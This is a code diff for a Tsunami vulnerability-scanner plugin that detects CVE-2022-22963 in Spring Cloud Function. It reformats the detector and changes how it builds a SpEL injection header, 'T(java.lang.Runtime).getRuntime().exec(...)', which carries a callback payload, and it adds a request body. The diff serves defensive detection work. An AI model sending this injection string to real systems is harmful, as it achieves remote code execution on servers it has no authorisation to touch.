@@ -23,6 +23,7 @@ import static com.google.tsunami.common.net.http.HttpRequest.post;
 import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
+import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
 import com.google.tsunami.common.net.http.HttpClient;
@@ -74,8 +75,8 @@ public final class Cve202222963VulnDetector implements VulnDetector {
   private final PayloadGenerator payloadGenerator;
 
   @Inject
-  Cve202222963VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient,
-      PayloadGenerator payloadGenerator) {
+  Cve202222963VulnDetector(
+      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
     this.httpClient = checkNotNull(httpClient);
     this.utcClock = checkNotNull(utcClock);
     this.payloadGenerator = checkNotNull(payloadGenerator);
@@ -114,12 +115,14 @@ public final class Cve202222963VulnDetector implements VulnDetector {
     if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
       return false;
     }
-    String commandToInject = String.format("T(java.lang.Runtime).getRuntime().exec("
-            + "new java.lang.String[]{\"sh\",\"-c\",\"%s\"})", payload.getPayload());
+    String commandToInject =
+        String.format("T(java.lang.Runtime).getRuntime().exec(\"%s\")", payload.getPayload());
     String targetUri = buildTargetUrl(networkService);
-    HttpRequest httpRequest = post(targetUri).setHeaders(
-        HttpHeaders.builder().addHeader(VULN_HEADER, commandToInject).build()
-    ).build();
+    HttpRequest httpRequest =
+        post(targetUri)
+            .setHeaders(HttpHeaders.builder().addHeader(VULN_HEADER, commandToInject).build())
+            .setRequestBody(ByteString.copyFromUtf8("TSUNAMI"))
+            .build();
     try {
       HttpResponse res = httpClient.send(httpRequest, networkService);
       return payload.checkIfExecuted(res.bodyBytes());
